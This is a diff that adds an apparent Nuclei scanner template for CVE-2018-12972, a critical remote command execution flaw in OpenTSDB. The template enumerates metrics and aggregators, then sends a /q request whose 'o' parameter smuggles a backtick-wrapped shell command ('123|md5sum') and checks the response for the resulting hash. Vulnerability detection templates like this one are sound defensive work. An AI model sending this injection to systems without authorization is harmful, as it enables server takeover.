@@ -1,0 +1,81 @@
+id: CVE-2018-12972
+info:
+  name: OpenTSDB q File o Parameter Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    OpenTSDB is an open-source, scalable distributed time series database. This vulnerability allows attackers to execute arbitrary code on the server side, potentially leading to control over the entire server.
+  reference:
+    - https://github.com/OpenTSDB/opentsdb/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2018-12972
+  tags: command-execution
+
+variables:
+  aggregator: '{{rand_int(100, 999)}}'
+  metric: '{{rand_int(100, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET /suggest?type=metrics HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "\\[\\\"(.*?)\\\""
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\\[\\\"(.*?)\\\""
+        name: metrics
+        internal: true
+
+  - raw:
+      - |
+        GET /aggregators HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "\\[\\\"(.*?)\\\""
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\\[\\\"(.*?)\\\""
+        name: aggregators
+        internal: true
+
+  - raw:
+      - |
+        GET /q?start=2006/06/27-00:00:15&end=2030/03/26-20:37:33&m={{aggregators}}:{{metrics}}&o=%60123|md5sum%60 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "d41d8cd98f00b204e9800998ecf8427e"
